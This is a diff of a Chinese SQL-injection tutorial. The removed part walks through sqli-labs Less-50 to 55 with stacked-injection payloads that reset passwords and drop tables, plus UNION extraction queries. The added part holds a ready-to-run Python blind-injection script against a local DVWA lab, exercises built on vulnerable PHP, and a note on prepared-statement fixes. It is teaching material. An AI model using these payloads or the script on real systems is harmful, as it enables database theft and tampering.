-#### ORDER BY注入的利用方式：
-
-| 利用方式 | 适用场景 | 优点 | 缺点 |
-|---------|---------|------|------|
-| **报错注入** | 有错误回显 | 速度快，效率高 | 需要有报错信息 |
-| **布尔盲注（排序法）** | 无报错但页面有差异 | 不需要sleep，速度较快 | 需要观察排序结果，比较费眼 |
-| **时间盲注** | 完全盲注，页面无差异 | 通用性强，几乎所有场景都能用 | 速度慢，比较费时间 |
-| **堆叠注入** | 支持多语句执行 | 功能强大，能做很多事 | 需要数据库支持多语句 |
-
-> **🧠 新手记忆口诀**：
-> Order By 不用怕，报错盲注都能打；
-> 联合注入用不了，还有其他好办法！😎
+> **🎯 正确修复结论：** 防 SQL 注入最彻底的办法只有一个——**预处理语句（PDO / MySqli Prepare）**，其他像 `addslashes`、WAF、黑名单、转义关键字，通通只是" delaying tactics（拖延战术）"，迟早能被绕过。
 
 ---
 
-### Less-50：GET - 数字型 - ORDER BY - 堆叠注入 🎯
+## 16.6 零基础懒人版：一键跑盲注的 Python 脚本 🔥
 
-**关卡特点**：ORDER BY注入、数字型、支持堆叠注入
+手动盲注太磨人？直接用下面这份 Python 脚本（布尔 + 时间 + Anti-CSRF Token 全支持），你改一下 `URL` 和 `cookies` 就能跑：
 
-#### 第一步：验证堆叠注入 🔧
+```python
+import requests, re, sys
 
-Less-50是ORDER BY注入的进阶版，支持堆叠注入！
+# ========== 配置区（你只需要改这里！） ==========
+TARGET = "http://192.168.56.102/dvwa/vulnerabilities/sqli_blind/"
+COOKIES = {"PHPSESSID": "ab12cd34ef56aa78bb90cc12ddeeff34", "security": "high"}
+USE_TOKEN = True       # Low/Med=False, High/Impossible=True
+TIME_BLIND = False     # True=时间盲注, False=布尔盲注
+SLEEP_SEC = 3          # 时间盲注延迟秒数
+CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-=_+[]{};:,.<>/?~ "
 
-我们来验证一下：
+def get_token(session, html):
+    m = re.search(r'name="user_token"\s+value="([0-9a-f]+)"', html)
+    return m.group(1) if m else None
+
+def do_query(session, condition):
+    """构造 payload 发送请求，返回 True/False"""
+    if TIME_BLIND:
+        payload = f"1' AND IF({condition}, SLEEP({SLEEP_SEC}), 0) -- "
+    else:
+        payload = f"1' AND {condition} -- "
+    data = {"id": payload, "Submit": "Submit"}
+    if USE_TOKEN:
+        html_get = session.get(TARGET, cookies=COOKIES).text
+        token = get_token(session, html_get)
+        if token: data["user_token"] = token
+    # 发送
+    if TIME_BLIND:
+        r = session.post(TARGET, data=data, cookies=COOKIES, timeout=15)
+        return r.elapsed.total_seconds() >= (SLEEP_SEC - 0.5)  # 留 0.5s 容差
+    else:
+        r = session.post(TARGET, data=data, cookies=COOKIES, timeout=15)
+        return "exists" in r.text and "MISSING" not in r.text
+
+def get_length(session, sql_expr):
+    """猜某个表达式的长度，二分 0~128"""
+    lo, hi = 0, 128
+    while lo < hi:
+        mid = (lo + hi + 1) // 2
+        if do_query(session, f"LENGTH(({sql_expr})) >= {mid}"):
+            lo = mid
+        else:
+            hi = mid - 1
+    return lo
+
+def get_string(session, sql_expr, length):
+    """逐字符爆破字符串"""
+    result = ""
+    sys.stdout.write(f"[*] 开始爆破 {sql_expr}（长度{length}）: ")
+    sys.stdout.flush()
+    for i in range(1, length + 1):
+        # 枚举可见字符（如果是 MD5，charset 取前 16 个就够了）
+        found = False
+        for ch in CHARSET:
+            cond = f"SUBSTRING(({sql_expr}),{i},1)=CHAR({ord(ch)})"
+            if do_query(session, cond):
+                result += ch
+                sys.stdout.write(ch)
+                sys.stdout.flush()
+                found = True
+                break
+        if not found:
+            result += "?"
+            sys.stdout.write("?")
+    print("  ✅")
+    return result
+
+if __name__ == "__main__":
+    s = requests.Session()
+    print("=" * 60)
+    print("  🦇 DVWA SQL Injection (Blind) 自动化脚本")
+    print("  📖 零基础同学只需修改本文件顶部的 5 个变量即可！")
+    print("=" * 60)
+
+    # 1. 先测连通性
+    print("\n[Step 1] 连通性测试（True/False 一致性）...")
+    t1 = do_query(s, "1=1")
+    t2 = do_query(s, "1=2")
+    assert t1 and not t2, "❌ True/False 判断不一致！检查 cookies/security 级别！"
+    print(f"    ✅ True={t1}, False={t2} — 完美连通！\n")
+
+    # 2. 爆数据库
+    print("[Step 2] 爆当前数据库名 DATABASE()")
+    db_len = get_length(s, "DATABASE()")
+    db_name = get_string(s, "DATABASE()", db_len)
+    print(f"    🎉 database = {db_name}\n")
+
+    # 3. 爆 admin 密码 hash
+    print("[Step 3] 爆 dvwa.users 里 admin 的 password 字段")
+    admin_pwd_sql = "SELECT password FROM users WHERE user='admin' LIMIT 1"
+    pwd_len = get_length(s, admin_pwd_sql)
+    pwd_md5 = get_string(s, admin_pwd_sql, pwd_len)
+    print(f"    🎉 admin.password = {pwd_md5}")
+    print(f"       👉 去 https://www.cmd5.com 解密 → 就是 'password'！\n")
+
+    print("🏁 盲注完成！恭喜你又点亮了一个黑客技能点！⭐")
 ```
-?sort=1; select sleep(3) --
-```
 
-如果页面延迟了3秒，说明堆叠注入成功了！
-
-#### 第二步：堆叠注入的利用 🛠️
-
-既然有堆叠注入，那能做的事情就太多了！
-
-**创建新表：**
-```
-?sort=1; create table test50 (id int, name varchar(100)) --
-```
-
-**插入数据：**
-```
-?sort=1; insert into test50 values(1, 'hello') --
-```
-
-**修改数据：**
-```
-?sort=1; update users set password='hacked' where id=1 --
-```
-
-**删表（危险操作，慎用！）：**
-```
-?sort=1; drop table test50 --
-```
-
-除此之外，我们还可以配合报错注入来获取数据：
-```
-?sort=1; select updatexml(1,concat(0x7e,version(),0x7e),1) --
-```
-
-不过要注意，堆叠注入的第二条语句的执行结果，一般不会直接显示在页面上，所以通常还是要配合盲注或者报错来使用。
+> 📚 **零基础使用说明：** 把第 5-8 行的 `TARGET`、`COOKIES`、`security` 改成你自己的（浏览器 F12 → Application → Cookies 复制 PHPSESSID），然后 `python sqli_blind.py` 运行即可。High 级别把 `USE_TOKEN=True`；页面真假分不清就把 `TIME_BLIND=True`。**跑一次脚本大概 2~10 分钟**（取决于你的网络和时间盲注的 SLEEP_SEC），中间它会一个字符一个字符地把结果打印出来，跟看电影一样爽！😎
 
 ---
 
-### Less-51：GET - 单引号 - ORDER BY - 堆叠注入 🎯
+## 16.7 课后自测 + 作业 📝（零基础必做！）
 
-**关卡特点**：ORDER BY注入、单引号闭合、堆叠注入
+### 📝 题 1：选择题（每题 10 分，共 30 分）
 
-#### 快速通关 ⚡
+**1. 下列哪种 SQL 注入场景，最适合用时间盲注？**
+- A. 页面把 SELECT 查询结果直接打印出来
+- B. 页面只有"查询成功/查询失败"两种不同的文字
+- C. 页面无论输入什么，返回的 HTML 内容完全一模一样
+- D. 页面会打印 MySQL 的报错信息
 
-Less-51和Less-50的区别，就是多了个单引号闭合。
+**2. 盲注里要"猜某个字符串第 3 个字符的 ASCII 码是不是大于 100"，下列哪个 MySQL 组合是对的？**
+- A. `SUBSTRING(str, 3, 1) > 100`
+- B. `ASCII(SUBSTRING(str, 3, 1)) > 100`
+- C. `LENGTH(SUBSTRING(str, 3, 1)) > 100`
+- D. `ASCII(CHARSET(str, 3, 1)) > 100`
 
-**验证堆叠注入：**
+**3. DVWA High 级别 SQLi Blind 加了 user_token Anti-CSRF，正确的绕过思路是？**
+- A. 直接在请求头里删掉 user_token 字段
+- B. 每次 POST 前先 GET 拿新 token，再带着这个 token 发 POST
+- C. 用 `SLEEP(3)` 把 token 睡过去
+- D. user_token 只能防御 XSS，对 SQL 注入没影响可以忽略
+
+### 🔧 题 2：实操题（每题 20 分，共 40 分）
+
+**实操 1：Low 级别布尔盲注手动爆 DATABASE()**
+打开 DVWA，切 security=low，进 SQL Injection (Blind)。**不用脚本**，就靠在输入框里一步步改 payload，用本章 16.2 节讲的二分法把 `DATABASE()` 的 4 个字符手动猜一遍，截图记录你的每一步。
+
+**实操 2：High 级别爆 admin 的 user 字段和 password 字段**
+切 security=high，用本章 16.6 节的 Python 脚本（把 `USE_TOKEN=True`，TIME_BLIND=True 最稳），爆出来 admin 的 user 和 password，确认 password 是 32 位的 `5f4dcc3b5aa765d61d8327deb882cf99`（即 MD5('password')）。
+
+### 💡 题 3：思考题（30 分）
+
+> 你是公司的 Web 开发者，同事写了下面这段 PHP 代码，自称"加了 `htmlspecialchars`，加了 `addslashes`，两层防护绝对安全"，你能找出至少 3 处"依然能被 SQL 盲注"的漏洞，并且写出一个能让页面延迟 3 秒的时间盲注 payload 吗？
+
+```php
+<?php
+$name = addslashes( htmlspecialchars($_POST['username']) );
+$sql  = "SELECT * FROM users WHERE username = $name LIMIT 1;";
+//                   ^^^^^^^^ 注意：这里 $name 外面没有引号！
+$result = mysqli_query($conn, $sql);
+if( mysqli_num_rows($result) > 0 ) echo "User exists.";
+else                               echo "User MISSING.";
+?>
 ```
-?sort=1'; select sleep(3) --
-```
 
-**改密码：**
-```
-?sort=1'; update users set password='newpass' where username='admin' --
-```
-
-**加用户：**
-```
-?sort=1'; insert into users values (66, 'hacker51', '123456') --
-```
-
-没错，就是这么简单！只要闭合方式对了，剩下的都是套路！😎
+> **小提示：** 跟 16.3 节 Medium 级别的思路几乎一模一样哦！🤫
 
 ---
 
-### Less-52：GET - 数字型 - ORDER BY - 堆叠 - 盲注 🎯
+## 16.8 本章小结 + 下章预告 🚀
 
-**关卡特点**：ORDER BY注入、数字型、堆叠注入、盲注
+**🎉 Day16 SQL 盲注 通关总结：**
+- ✅ 搞懂了三种注入的区别：**显注（话痨客服）/ 布尔盲注（高冷客服）/ 时间盲注（哑巴客服）**
+- ✅ 盲注必备五件套背得滚瓜烂熟：**LENGTH + SUBSTRING + ASCII + SLEEP + IF**
+- ✅ 标准四步流程刻进 DNA：**①闭合 True/False → ②猜长度 → ③逐个字符二分 → ④拼接答案**
+- ✅ Low 级别裸注入、Medium 级别"加了转义却忘了加引号"的数字型绕过、High 级别 Anti-CSRF Token + LIMIT 1 双重伪防护绕过
+- ✅ Impossible 级别的正确修复三件套：**intval 强类型 + PDO 预处理 + rowCount 严格校验**
+- ✅ 拿到了一份能直接跑的 Python 盲注脚本（布尔/时间/Token 三合一）
 
-#### 关卡分析 📊
+盲注这个专题是整个 SQL 注入里**最耗耐心但也最出活儿**的一块——**你今天手动猜出 'dvwa' 那 4 个字符时的成就感，就是你日后做渗透工程师拿到第一个站点 root 权限时的感觉。**👍
 
-Less-52 = Less-50 + 盲注
+下一章 Day17 我们学一个"看起来很简单但威力巨大"的漏洞——**Open HTTP Redirect 开放式重定向漏洞**，它是钓鱼攻击的第一"帮凶"：比如你收到"工商银行的短信"让你去 `icbc.com.cn/login?redirect=http://hacker.com`，你点进去先是真工行登录页，输完账号密码瞬间跳转到黑客的假页面——这就是重定向漏洞！Day17 我们拿 DVWA 的 Redirect 模块，Low/Med/High 三种方式逐个绕过，还会给你真实钓鱼案例，绝对精彩！💪
 
-也就是说，支持堆叠注入，但没有错误回显。
-
-那怎么验证堆叠注入呢？老办法，**时间盲注**！
-```
-?sort=1; select sleep(5) --
-```
-
-延迟了5秒，说明堆叠注入可用！✅
-
-那怎么拿数据呢？我们可以：
-1. 用堆叠插入数据，然后用布尔盲注看排序变化
-2. 直接用时间盲注来猜数据
-3. 用堆叠创建新表，然后……（方法很多，发挥想象力！）
-
-其实最简单的还是直接用时间盲注：
-```
-?sort=1 and if(ascii(substr(database(),1,1))=115, sleep(5), 1)
-```
-
-或者用堆叠+时间盲注的组合：
-```
-?sort=1; select if(ascii(substr(database(),1,1))=115, sleep(5), 1) --
-```
-
-条条大路通罗马，只要能拿到数据，用什么方法都行！🛤️
-
----
-
-### Less-53：GET - 单引号 - ORDER BY - 堆叠 - 盲注 🎯
-
-**关卡特点**：ORDER BY注入、单引号闭合、堆叠注入、盲注
-
-#### 快速通关 ⚡
-
-最后一关了！Less-53 = Less-52 + 单引号闭合
-
-**验证堆叠注入：**
-```
-?sort=1'; select sleep(5) --
-```
-
-**时间盲注拿数据：**
-```
-?sort=1' and if(ascii(substr(database(),1,1))=115, sleep(5), 1) --
-```
-
-**堆叠改密码：**
-```
-?sort=1'; update users set password='hacked' where username='admin' --
-```
-
-完美！ORDER BY注入这一部分我们就全部通关了！🎉🎉🎉
-
----
-
-## 第三部分：查询次数限制挑战（Less54-55）⏱️
-
-### 什么？查询次数也有限制？😱
-
-接下来的两关，我们要面对一个全新的挑战：**查询次数限制**！
-
-什么意思呢？就是说，你访问这个页面的次数是有限的！比如Less-54只有10次查询机会，Less-55只有14次。超过这个次数，数据库就会重置，你之前做的所有操作都白费了！
-
-这就像是打游戏只有10条命，死了就得重新开始！🎮
-
-为什么会有这种关卡呢？因为在真实的渗透测试中，有时候你的操作是会被记录的，或者你只能有限次地访问目标系统。这时候就需要我们**高效利用每一次查询**，用最少的次数拿到最多的数据。
-
-好，让我们来挑战一下吧！💪
-
----
-
-### Less-54：GET - 单引号 - 10次查询限制 - UNION联合查询 🎯
-
-**关卡特点**：单引号闭合、只有10次查询机会、需要拿到secret key
-
-#### 第一步：理解关卡规则 📜
-
-打开Less-54，我们看到页面上写着：
-```
-WELCOME TO LESS-54
-Your Query count is: 1 of 10
-```
-意思是你已经用了1次查询，还剩9次。总共只有10次机会！
-
-我们的目标是什么呢？页面上还写着：
-```
-We have a secret key stored in table "Z7BS4DYGOO" of database "challenges", find that secret key and submit it to win.
-```
-
-翻译一下：
-- 数据库名：`challenges`
-- 表名：`Z7BS4DYGOO`（注意：每次重置可能不一样！）
-- 我们需要找到里面的 **secret key**，然后提交才能获胜！
-
-但是等等，表名怎么是乱码一样的东西？因为每次重置数据库，表名都会变！所以我们不能直接用，得自己查出来！
-
-#### 第二步：制定策略 🎯
-
-只有10次机会，我们得好好规划一下怎么用。
-
-先想想，我们需要做哪些事情：
-1. 判断注入点和闭合方式（1次）
-2. 判断字段数（1-2次）
-3. 找表名（1次）
-4. 找列名（1次）
-5. 拿数据（1次）
-6. 提交secret key（1次）
-
-嗯……这样算下来，6次左右就够了，10次机会完全够用！
-
-关键是要用**效率最高**的注入方式。什么方式效率最高？当然是**联合注入**！一次就能拿到想要的数据！
-
-> **💡 生活小比喻**：这就像是你去超市买东西，只有10块钱，你得精打细算，买最划算的东西。联合注入就像是"一站式购物"，一次就能买齐所有东西，最省钱！🛒
-
-#### 第三步：具体操作 🛠️
-
-**第1次查询：判断注入点和闭合方式**
-```
-?id=1'
-```
-报错了，说明是单引号字符型注入。（顺便用掉了第2次？不，我们访问第一次的时候已经算1次了）
-
-好，那我们重新数：
-- 打开页面 → 第1次（id=1）
-- 测试单引号 → 第2次
-
-**第3次查询：判断字段数**
-```
-?id=1' order by 3 --
-```
-正常显示，说明至少有3个字段。
-```
-?id=1' order by 4 --
-```
-报错，说明只有3个字段。（这是第4次查询了）
-
-**第5次查询：联合查询找显示位**
-```
-?id=-1' union select 1,2,3 --
-```
-看看哪些位置能显示数据。
-
-**第6次查询：查表名**
-```
-?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='challenges' --
-```
-这样一次就能把所有表名都查出来！用group_concat把所有表名拼在一起。
-
-假设得到表名是 `Z7BS4DYGOO`（你的可能不一样）
-
-**第7次查询：查列名**
-```
-?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='Z7BS4DYGOO' --
-```
-一次拿到所有列名。
-
-假设列名有 `id` 和 `secret_XXXX` 之类的。
-
-**第8次查询：拿secret key**
-```
-?id=-1' union select 1,secret_XXXX,3 from Z7BS4DYGOO --
-```
-一次拿到数据！
-
-**第9-10次：提交secret key**
-在页面上找到提交的地方，把key输进去，完成！🎉
-
-看看，我们只用了8-9次查询就搞定了，10次机会完全够用！
-
-> **🧠 高效技巧**：
-> 1. 用 `group_concat()` 一次把所有数据都查出来，不用limit一个个猜
-> 2. 优先用联合注入，效率最高
-> 3. 提前规划好每一步，不要做无用功
-> 4. 能一次搞定的，绝不分成两次！
-
----
-
-### Less-55：GET - 单引号+括号 - 14次查询限制 - 联合查询 🎯
-
-**关卡特点**：14次查询限制、单引号+括号闭合、联合查询
-
-#### 关卡分析 📊
-
-Less-55和Less-54几乎一样，都是查询次数限制的挑战，目标都是找到secret key。
-
-区别在于：
-- Less-54：10次机会，单引号闭合
-- Less-55：14次机会，单引号+括号闭合
-
-14次机会比10次还多，那就更轻松了！😎
-
-#### 快速通关 ⚡
-
-**判断闭合方式：**
-```
-?id=1') --
-```
-如果正常显示，说明闭合成功。
-
-**判断字段数：**
-```
-?id=1') order by 3 --
-```
-
-**联合查询：**
-```
-?id=-1') union select 1,2,3 --
-```
-
-**查表名：**
-```
-?id=-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='challenges' --
-```
-
-**查列名：**
-```
-?id=-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_name='表名' --
-```
-
-**拿数据：**
-```
-?id=-1') union select 1,secret列名,3 from 表名 --
-```
-
-搞定！14次机会绰绰有余！🎉
-
-> **💡 进阶思考**：如果查询次数更少呢？比如只有5次机会怎么办？
-> 
-> 其实还可以更高效！比如：
-> - 直接猜表名？（不太靠谱）
-> - 用盲注+二分法？（但盲注需要很多次）
-> - 有没有办法一次就把表名、列名、数据都查出来？
-> 
-> 答案是：**用联合查询+复杂的SQL语句**，比如把子查询嵌套起来，一次就能查出很多信息。
-> 
-> 不过在Less54和55中，次数给的还比较充足，我们暂时不用考虑那么极端的情况。但这个思路是对的：**注入也是一门艺术，追求的是用最少的代价拿到最多的成果！**🎨
-
----
-
-## 本章总结 🎉
-
-恭喜你！又完成了一章的学习！让我们来回顾一下这一章都学了什么：
-
-### 1. 堆叠注入进阶 📚
-
-我们学习了堆叠注入在不同场景下的应用：
-- **GET型堆叠注入**（Less-41）：URL参数里的堆叠注入
-- **POST型堆叠注入**（Less-42/43）：登录框里的堆叠注入，可以改密码、加用户
-- **盲注型堆叠注入**（Less-44/45）：没有回显也能操作数据库
-
-**堆叠注入的核心**：一次执行多条SQL语句，功能强大，几乎无所不能！
-
-### 2. ORDER BY注入 📊
-
-这是本章的重点和难点！我们学习了：
-- **什么是ORDER BY注入**：注入点在ORDER BY子句后面
-- **为什么特殊**：联合注入用不了！
-- **四种利用方式**：
-  1. 报错注入（最快，需要报错回显）
-  2. 布尔盲注（排序法，需要观察页面差异）
-  3. 时间盲注（最慢，但通用性最强）
-  4. 堆叠注入（功能最强大，但需要数据库支持）
-
-**Less46-53** 这8关，就是ORDER BY注入的各种排列组合：
-- 有没有报错？→ 报错注入 / 盲注
-- 怎么闭合？→ 数字型 / 单引号
-- 支持堆叠吗？→ 普通 / 堆叠
-
-### 3. 查询次数限制挑战 ⏱️
-
-Less-54和Less-55给我们带来了全新的挑战：
-- **资源有限**：查询次数有限制
-- **需要高效**：每一次查询都要用在刀刃上
-- **最优解思维**：用最少的次数完成任务
-
-**核心思路**：
-- 优先用联合注入（效率最高）
-- 用 `group_concat()` 一次查多条数据
-- 提前规划，不做无用功
-
----
-
-### 下章预告 📢
-
-下一章我们将进入 **Less56-65** 的挑战！那里还有更多更有意思的场景等着我们：
-- 更多的查询限制挑战
-- 更复杂的注入场景
-- 更接近实战的漏洞环境
-
-是不是已经开始期待了？😆
-
-> **💪 给新手的鼓励**：
-> 学到这里，你已经掌握了SQL注入的大部分核心技巧了！可能有些地方你还不太熟练，没关系，多练几次就好了。就像是学骑车，刚开始可能会摔几跤，但摔着摔着就会了！🚴
-> 
-> 安全之路漫漫，但只要你坚持走下去，一定能看到最美的风景！🏞️
-
-我们下一章见！👋
+**同学们先把脚本跑通，把练习题做完。Day17 我们不见不散！👋**
